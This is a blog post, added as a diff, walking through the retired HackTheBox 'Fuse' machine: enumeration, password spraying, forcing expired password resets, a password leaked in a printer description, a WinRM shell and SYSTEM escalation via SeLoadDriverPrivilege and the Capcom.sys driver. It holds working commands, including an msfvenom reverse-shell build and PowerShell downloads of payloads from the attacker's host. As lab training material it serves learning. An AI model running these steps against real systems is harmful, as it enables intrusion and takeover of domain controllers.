@@ -1,0 +1,610 @@
+---
+layout: walkthrough
+title: HackTheBox - Fuse
+date: 2020-11-01 12:00:00 +0200
+img: ChallengeVMs/HTB_Icons/fuse.png # Add image post (optional)
+status: Retired
+description: Hi all, My name is Kyhle Öhlinger and this post forms part of my challenge VM writeups. If you enjoy any of the posts, feel free to reach out and let me know :) 
+---
+
+Hi everyone, today we are going to be looking at Fuse --`10.10.10.193`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Fuse/Overview.png"  style="width: 65%" />
+</p>
+
+## Information Gathering
+
+In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.
+
+### Nmap Output
+
+<details>
+
+```bat
+vagrant@ko:~/Desktop/HackTheBox/Fuse$ nmap -sC -sV 10.10.10.193
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 15:49 EDT
+Nmap scan report for 10.10.10.193
+Host is up (0.19s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
+|     version
+|_    bind
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-10-05 18:09:23Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=10/5%Time=5F7B78D8%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 39m44s, deviation: 4h02m31s, median: -1h40m16s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)                                     
+|   Computer name: Fuse                                                                                           
+|   NetBIOS computer name: FUSE\x00                                                                               
+|   Domain name: fabricorp.local                                                                                  
+|   Forest name: fabricorp.local                                                                                  
+|   FQDN: Fuse.fabricorp.local                                                                                    
+|_  System time: 2020-10-05T11:11:49-07:00                                                                        
+| smb-security-mode:                                                                                              
+|   account_used: <blank>                                                                                         
+|   authentication_level: user                                                                                    
+|   challenge_response: supported                                                                                 
+|_  message_signing: required                                                                                     
+| smb2-security-mode:                                                                                             
+|   2.02:                                                                                                         
+|_    Message signing enabled and required                                                                        
+| smb2-time:
+|   date: 2020-10-05T18:11:46
+|_  start_date: 2020-10-05T06:45:59
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 332.69 seconds
+
+```
+
+</details>
+
+
+From the output shown above, we can see that the machine is a Windows domain controller, and I added `FABRICORP.LOCAL` to the `/etc/hosts` file. Since it's a domain controller, I also added `fabricorp.local` to `/etc/resolv.conf` so that it can resolve additional DNS entries. Additionally, I generally start of with some basic unauthenticated LDAP queries in order to get more information about the machine. I created a [ldap-query](https://github.com/KyhleOhlinger/PentestScripts/blob/master/Bash%20Scripts/ldap.sh) script a while ago, and I'm going to be making use of it during the enumeration phase. 
+
+### LDAP-Enumeration:
+
+<details>
+
+```bat
+vagrant@ko:~/Desktop/HackTheBox/Fuse$ ldap-query fabricorp.local
+Domain Name: fabricorp.local
+Username: 
+Password: 
+DC=fabricorp,DC=local
+
+[0] DHCP Discovery
+[1] DNS Server Enumeration
+[2] Domain Users
+[3] Domain Groups
+[4] Domain Admins
+[5] Domain Computers
+[6] Kerberoastable SPNs
+[7] Service Principal Names
+[8] GPO Names
+[9] Users with Unconstrained Delegation
+[10] Computers with Unconstrained Delegation
+[11] Admin Objects
+[12] Potential Passwords
+[13] ACL Information
+
+Please Choose the Query you want to run and the press [ENTER]: 2
+ldap_bind: Invalid credentials (49)
+        additional info: 80090308: LdapErr: DSID-0C090442, comment: AcceptSecurityContext error, data 52e, v3839
+
+```
+
+</details>
+As shown above, there seemed to be some issues with the LDAP connection, so I decided to change tactics and started with some unauthenticated enumeration. The commands for unauthenticated RPC and SMB enumeration are shown below, respectively:
+
+<details>
+
+```bat
+vagrant@ko:~/Desktop/HackTheBox/Fuse$ rpcclient 10.10.10.193 -U ''
+Enter WORKGROUP\'s password: 
+rpcclient $> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $> exit
+```
+
+```bat
+vagrant@ko:~/Desktop/HackTheBox/Fuse$ smbclient -L //10.10.10.193/
+Enter WORKGROUP\vagrant's password: 
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+SMB1 disabled -- no workgroup available
+```
+
+</details>
+
+Since I added `fabricorp.local` to the `/etc/resolv.conf` file, I was able to navigate to `fabricorp.local` and it resolved to <http://fuse.fabricorp.local/papercut/logs/html/index.htm> automatically. If you didn't add it to the `/etc/resolv.conf` file and just added it to the `/etc/hosts` file, you would need to do some additional subdomain enumeration to lead you to `fuse.fabricorp.local` which you would then need to add to the `/etc/hosts` file. While I was enumerating the web application manually, I ran Gobuster in the background. The output from the scans is shown below:
+
+<details>
+
+```bat
+
+vagrant@ko:~/Desktop/HackTheBox/Fuse$ gobuster dir -u http://fuse.fabricorp.local/papercut -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://fuse.fabricorp.local/papercut
+[+] Threads:        10
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/10/05 16:12:15 Starting gobuster
+===============================================================
+/. (Status: 403)
+===============================================================
+2020/10/05 16:17:38 Finished
+===============================================================
+```
+
+</details>
+
+During the automated enumeration phase, I decide to navigate to the web page and begin some manual enumeration. The index page is shown below:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Fuse/img1.png"  style="width: 80%" />
+</p>
+
+Since the web application contained static pages (.htm files) with no user input and searchsploit didn't provide us with any information, I needed to try and find some additional information by just browsing the web application. Navigating through each HTML file provided me with the following usernames:
+
+* pmerton
+* tlavel
+* sthompson
+* bhult
+* administrator
+
+
+### Password Bruteforcing
+If you wanted to confirm that the usernames existed within the domain, you could have used [kerbrute](https://github.com/ropnop/kerbrute) with the following command:
+
+```bat
+kerbrute userenum -d fabricorp.local users.lst
+```
+
+However I just assumed that the usernames existed and decided to create a wordlist for passwords. I didn't know what the password policy was, so I decided to create a wordlist with a minimum of 6 characters. I included the `--with-numbers` flag since we're looking for passwords specifically. The command is shown below:
+
+```bat
+cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm -m 6 -d 3 -w fuse_wordlist.lst --with-numbers
+```
+
+If you  didn't want to use cEWL, you can also compile your own small list and use [hashcat rules]( https://hashcat.net/wiki/doku.php?id=rule_based_attack) to generate your own custom wordlist as shown below:
+
+```bat
+hashcat --force custom -r /usr/share/hashcat/rules/best64.rule --stdout > hashcat_wordlist.lst
+```
+
+I did not use this method myself, instead I made use of cEWL, however during actual penetration assessments, it will most likely be more fruitful to generate custom wordlists based on rulesets. Once I had the wordlist, I decided to run it through CrackMapExec with the usernames that I obtained from the web application. The CrackMapExec command and the output of the command is shown below:
+```bat
+cme smb 10.10.10.193 -u users.lst -p fuse_wordlist.lst
+```
+<details>
+
+
+```bat
+cme smb 10.10.10.193 -u users.lst -p fuse_wordlist.lst
+
+
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\pmerton:Fabricorp01 STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\sthompson:Fabricorp01 STATUS_LOGON_FAILURE
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\administrator:Fabricorp01 STATUS_LOGON_FAILURE
+
+```
+</details>
+
+You can include the `--continue-on-success` flag so CME doesn't stop after finding a single successful authentication attempt.
+
+## Lateral Movement using BHult
+
+As can be seen from the output above, two users: `tlavel` and `bhult` have the error `STATUS_PASSWORD_MUST_CHANGE`.  The [Samba documentation](https://www.samba.org/samba/docs/current/man-html/smbpasswd.8.html#:~:text=If%20you%20have%20a%20blank,Windows%20NT%20Primary%20Domain%20Controllers) provides a breakdown of the functionality, but the TL;DR is provided below. In order to change a user's password using samba, you can make use of the following command:
+
+```bat
+smbpasswd -U <user> -r <IP address of DC>
+```
+If the `-U` and `-r` flags are not specified, the username whose password is changed is that of the current UNIX logged on user. 
+
+* **-U** -- This option may only be used in conjunction with the `-r` option. When changing a password on a remote machine it allows the user to specify the user name on that machine whose password will be changed. It is present to allow users who have different user names on different systems to change these passwords.
+* **-r** -- remote machine name. This option allows a user to specify what machine they wish to change their password on. Without this parameter `smbpasswd` defaults to the local host. The remote machine name is the NetBIOS name of the SMB/CIFS server to contact to attempt the password change. This name is resolved into an IP address using the standard name resolution mechanism in all programs of the Samba suite. See the -R name resolve order parameter for details on changing this resolving mechanism.
+
+
+> Note that if changing a Windows NT Domain password the remote machine specified must be the Primary Domain Controller for the domain (Backup Domain Controllers only have a read-only copy of the user account database and will not allow the password change).
+> Note that Windows 95/98 do not have a real password database so it is not possible to change passwords specifying a Win95/98 machine as remote machine target.
+
+
+Using this information, I decided to change the passwords of the `tlavel` and `bhult` users. The output is shown below:
+<details>
+
+```bat
+vagrant@ko:/usr/share/seclists$ smbpasswd -U tlavel -r 10.10.10.193
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed for user tlavel
+```
+
+</details>
+
+Once I changed the user passwords, I attempted to authenticate using `smbclient`. The output of which is shown below:
+
+<details>
+
+```bat
+vagrant@ko:/usr/share/seclists$ smbclient -L //10.10.10.193/ --user=tlavel --workgroup=FABRICORP
+Enter FABRICORP\tlavel's password: 
+session setup failed: NT_STATUS_LOGON_FAILURE
+
+
+
+vagrant@ko:/usr/share/seclists$ smbclient -L //10.10.10.193/ --user=bhult --workgroup=FABRICORP
+Enter FABRICORP\bhult's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        HP-MFT01        Printer   HP-MFT01
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        print$          Disk      Printer Drivers
+        SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+```
+</details>
+
+
+If RPC NULL sessions worked for RPCClient, we could have changed the user's passwords with the following command:
+
+```bat
+setuserinfo2 tlavel 23 Fabricorp01
+```
+
+### RPCClient Enumeration
+
+For some reason, I could not authenticate with `tlavel`, but I could with `bhult`. In order to perform authenticated enumeration, I changed `bhult's` password and authenticated to the RPC protocol. The output is shown below:
+
+<details>
+
+```bat
+rpcclient $> enumdomusers 
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[svc-print] rid:[0x450]
+user:[bnielson] rid:[0x451]
+user:[sthompson] rid:[0x641]
+user:[tlavel] rid:[0x642]
+user:[pmerton] rid:[0x643]
+user:[svc-scan] rid:[0x645]
+user:[bhult] rid:[0x1bbd]
+user:[dandrews] rid:[0x1bbe]
+user:[mberbatov] rid:[0x1db1]
+user:[astein] rid:[0x1db2]
+user:[dmuir] rid:[0x1db3]
+```
+```bat
+rpcclient $> enumprivs
+found 35 privileges
+
+SeCreateTokenPrivilege          0:2 (0x0:0x2)
+SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
+SeLockMemoryPrivilege           0:4 (0x0:0x4)
+SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
+SeMachineAccountPrivilege               0:6 (0x0:0x6)
+SeTcbPrivilege          0:7 (0x0:0x7)
+SeSecurityPrivilege             0:8 (0x0:0x8)
+SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
+SeLoadDriverPrivilege           0:10 (0x0:0xa)
+SeSystemProfilePrivilege                0:11 (0x0:0xb)
+SeSystemtimePrivilege           0:12 (0x0:0xc)
+SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
+SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
+SeCreatePagefilePrivilege               0:15 (0x0:0xf)
+SeCreatePermanentPrivilege              0:16 (0x0:0x10)
+SeBackupPrivilege               0:17 (0x0:0x11)
+SeRestorePrivilege              0:18 (0x0:0x12)
+SeShutdownPrivilege             0:19 (0x0:0x13)
+SeDebugPrivilege                0:20 (0x0:0x14)
+SeAuditPrivilege                0:21 (0x0:0x15)
+SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
+SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
+SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
+SeUndockPrivilege               0:25 (0x0:0x19)
+SeSyncAgentPrivilege            0:26 (0x0:0x1a)
+SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
+SeManageVolumePrivilege                 0:28 (0x0:0x1c)
+SeImpersonatePrivilege          0:29 (0x0:0x1d)
+SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
+SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
+SeRelabelPrivilege              0:32 (0x0:0x20)
+SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
+SeTimeZonePrivilege             0:34 (0x0:0x22)
+SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
+SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
+```
+</details>
+
+
+If you recall from the SMB output above, there was a printer: `HP-MFT01` on the network. Since we know that there is a printer, a `svc-print` account and the web application points to a PaperCut printer web page, I decided to enumerate the printer information via RPC. This can be done by running the `enumprinters` command.
+
+<details>
+
+```bat
+rpcclient $> enumprinters 
+        flags:[0x800000]
+        name:[\\10.10.10.193\HP-MFT01]
+        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+        comment:[]         
+```
+
+As shown above, we were able to enumerate the `scan2docs` printer account, which resulted in us obtaining the following password: `$fab@s3Rv1ce$1`.
+
+</details>
+## Lateral Movement using svc-print
+
+Since I had a password, I put usernames obtained from the `enumdomusers` command into a list and ran the password against them using CrackMapExec against the winrm protocol. the output of which is shown below:
+
+<details>
+
+```bat 
+vagrant@ko:~/Desktop/HackTheBox/Fuse$ cme winrm 10.10.10.193 -u users.lst -p '$fab@s3Rv1ce$1' -d fabricorp.local
+WINRM       10.10.10.193    5985   10.10.10.193     [*] http://10.10.10.193:5985/wsman
+WINRM       10.10.10.193    5985   10.10.10.193     [-] fabricorp.local\Administrator:$fab@s3Rv1ce$1
+WINRM       10.10.10.193    5985   10.10.10.193     [-] fabricorp.local\Guest:$fab@s3Rv1ce$1
+WINRM       10.10.10.193    5985   10.10.10.193     [-] fabricorp.local\krbtgt:$fab@s3Rv1ce$1
+WINRM       10.10.10.193    5985   10.10.10.193     [-] fabricorp.local\DefaultAccount:$fab@s3Rv1ce$1
+WINRM       10.10.10.193    5985   10.10.10.193     [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
+
+```
+</details> 
+ 
+ 
+In order to determine which protocol can be exploited to give you an interactive shell, you can use CrackMapExec, e.g. `cme smb 10.10.10.193 -u svc-print -p "<pass>"`, and if it has output with the word (Pwn3d!), then you know that you can exploit that protocol for a shell. In this instance SMB did not result in a shell, but WinRM did, so we can make use of `Evil-WinRM`.
+
+### Evil-WinRM
+
+Now that we had another username, password combination: `svc-print:$fab@s3Rv1ce$1`, I decided to attempt to authenticate to the host using Evil-Winrm with the following command:
+
+```bat
+evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i fabricorp.local 
+```
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Fuse/img2.png"  style="width: 80%" />
+</p>
+ 
+## Privilege Escalation
+
+With access to the host, we can now run some basic information gathering against the user account.
+
+<details>
+
+```bat
+*Evil-WinRM* PS C:\Users\svc-print\Desktop> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ==============================================
+fabricorp\svc-print S-1-5-21-2633719317-1471316042-3957863514-1104
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ==================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Print Operators                    Alias            S-1-5-32-550                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+FABRICORP\IT_Accounts                      Group            S-1-5-21-2633719317-1471316042-3957863514-1604 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeLoadDriverPrivilege         Load and unload device drivers Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+ 
+
+```
+</details>
+
+This [presentation](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf) by Andrea Pierini provides a fantastic overview of whoami privileges and I would highly recommend reading through the slides if you have the time. According to the slides, the `SeLoadDriverPrivilege` has the following attributes associated with it:
+
+ 
+>This user right determines which users can dynamically load and unload device drivers or other code in to kernel mode.
+
+>&rarr; Members of domain group “Printer Operators” have this privilege on the DC
+
+>&rarr; To abuse from this privilege you have to install & load a “vulnerable” signed driver
+
+>&rarr; You have to “trick” NtLoadDriver() in order to load the driver parameters from an alternate location in the registry (default HKLM\System\...)
+
+>&rarr; Example: Install & Load vulnerable szkg64.sys driver (STOPZilla) 
+ 
+### Abusing SeLoadDriver Privilege
+
+The following blog post provides an amazing overview of the `SeLoadDriverPrivilege`: <https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/>
+
+If you are creating your own service, by default the driver service name should be under `\Registry\Machine\System\CurrentControlSet\Services\`. Note, that the driver must be signed by Windows so you cannot load arbitrary drivers. But, `Capcom.sys` can be abused to execute arbitrary code and is signed by Windows, so the goal is to load this driver and exploit it. You can download `Capcom.sys` from Fuzzy Security's [Github](https://github.com/FuzzySecurity/Capcom-Rootkit/tree/master/Driver) page. You can then load the driver using the following command:
+
+```bat
+EOPLOADDRIVER.exe RegistryKey DriverImagePath
+```
+
+Once the driver is loaded it is possible to run any desired exploit. We modified [Tandasat’s exploit](https://github.com/tandasat/ExploitCapcom) “ExploitCapcom” to obtain a terminal as SYSTEM. The output below shows the changes that were required for the Capcom exploit:
+
+<details>
+
+```c++
+
+static bool LaunchShell()
+{
+    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
+    PROCESS_INFORMATION ProcessInfo;
+    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
+    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
+        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
+        &ProcessInfo))
+    {
+        return false;
+    }
+
+    CloseHandle(ProcessInfo.hThread);
+    CloseHandle(ProcessInfo.hProcess);
+    return true;
+}
+```
+```c++
+static bool LaunchShell()
+{
+    TCHAR CommandLine[] = TEXT("C:\\Users\\svc-print\\Documents\\reverse.exe");
+    PROCESS_INFORMATION ProcessInfo;
+    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
+    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
+        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
+        &ProcessInfo))
+    {
+        return false;
+    }
+
+    CloseHandle(ProcessInfo.hThread);
+    CloseHandle(ProcessInfo.hProcess);
+    return true;
+}
+```
+
+</details>
+
+Now that we have modified and compiled the exploit using Visual Studio, I needed to create the reverse shell as shown below:
+
+
+<details>
+
+```bat
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.77 LPORT=80 -f exe > reverse.exe
+vagrant@ko:/mnt/hgfs/VM_Setup/Fuse_Exploit$ drivermsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.77 LPORT=4444 -f exe > msf.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+```
+</details>
+
+Finally, we need to upload the following files to the host:
+* reverse.exe -- The reverse shell we created above
+* EOPTest.exe -- The EOPLOADDRIVER.exe which we compiled with Visual Studio
+* ExploitCapcom.exe -- The exploit code we modified to call our reverse shell
+* Capcom.sys -- The driver that we have selected to exploit
+
+I used the following commands to upload the files described above:
+
+<details>
+
+```powershell
+*Evil-WinRM* PS C:\Users\svc-print\Documents> powershell Invoke-Webrequest  -OutFile C:\\Users\\svc-print\\Documents\\reverse.exe -Uri  http://10.10.14.77/reverse.exe
+*Evil-WinRM* PS C:\Users\svc-print\Documents> powershell Invoke-Webrequest  -OutFile C:\\Users\\svc-print\\Documents\\EOPTest.exe -Uri  http://10.10.14.77/EOPTest.exe
+*Evil-WinRM* PS C:\Users\svc-print\Documents> powershell Invoke-Webrequest  -OutFile C:\\Users\\svc-print\\Documents\\ExploitCapcom.exe -Uri  http://10.10.14.77/ExploitCapcom.exe
+
+*Evil-WinRM* PS C:\Users\svc-print\Documents> powershell Invoke-Webrequest  -OutFile C:\\Users\\svc-print\\Documents\\Capcom.sys -Uri  http://10.10.14.77/Capcom.sys
+
+```
+</details>
+
+Now that we have uploaded the files to the host, we can run the exploit. First we need to load the driver using the following command:
+```bat
+ .\EOPLOADDRIVER.exe SYSTEM\CurrentControlSet\MyService C:\temp\Capcom.sys
+ ```
+<details>
+
+```powershell
+*Evil-WinRM* PS C:\temp> .\EOPLOADDRIVER.exe SYSTEM\CurrentControlSet\MyService C:\temp\Capcom.sys
+[+] Enabling SeLoadDriverPrivilege
+[+] SeLoadDriverPrivilege Enabled
+[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\SYSTEM\CurrentControlSet\MyService
+NTSTATUS: c000010e, WinError: 0
+```
+</details>
+
+Once the driver was loaded we ran the `ExploitCapcom.exe` exploit using the following command:
+```bat
+.\ExploitCapcom.exe
+```
+
+<details>
+```powershell
+*Evil-WinRM* PS C:\temp> .\ExploitCapcom.exe
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 0000028E2AFD0008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[+] The SYSTEM shell was launched
+[*] Press any key to exit this program
+```
+
+</details>
+
+The reverse shell connecting back to me is shown below:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Fuse/img4.png"  style="width: 80%" />
+</p>
+
+That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.
